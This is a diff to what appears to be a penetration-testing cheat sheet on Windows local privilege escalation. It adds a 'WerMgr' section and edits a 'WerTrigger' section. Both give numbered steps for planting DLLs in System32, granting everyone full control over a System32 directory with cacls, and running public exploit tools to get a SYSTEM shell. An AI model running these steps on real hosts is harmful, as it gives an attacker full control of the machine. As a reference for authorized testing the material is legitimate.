@@ -55,6 +55,7 @@
     * [DiagHub](#diaghub)
     * [UsoDLLLoader](#usodllloader)
     * [WerTrigger](#wertrigger)
+    * [WerMgr](#wermgr)
 * [EoP - Common Vulnerabilities and Exposures](#eop---common-vulnerabilities-and-exposure)
     * [MS08-067 (NetAPI)](#ms08-067-netapi)
     * [MS10-015 (KiTrap0D)](#ms10-015-kitrap0d---microsoft-windows-nt2000--2003--2008--xp--vista--7)
@@ -1359,12 +1360,22 @@ If we found a privileged file write vulnerability in Windows or in some third-pa
 
 ### WerTrigger
 
-> Weaponizing for privileged file writes bugs with Windows problem reporting
+> Exploit Privileged File Writes bugs with Windows Problem Reporting
 
 1. Clone https://github.com/sailay1996/WerTrigger
 2. Copy `phoneinfo.dll` to `C:\Windows\System32\`
 3. Place `Report.wer` file and `WerTrigger.exe` in a same directory.
 4. Then, run `WerTrigger.exe`.
+5. Enjoy a shell as **NT AUTHORITY\SYSTEM**
+
+### WerMgr
+
+> Exploit Privileged Directory Creation Bugs with Windows Error Reporting
+
+1. Clone https://github.com/binderlabs/DirCreate2System
+2. Create directory `C:\Windows\System32\wermgr.exe.local\`
+3. Grant access to it: `cacls C:\Windows\System32\wermgr.exe.local /e /g everyone:f`
+4. Place `spawn.dll` file and `dircreate2system.exe` in a same directory and run `.\dircreate2system.exe`. 
 5. Enjoy a shell as **NT AUTHORITY\SYSTEM**
 
 
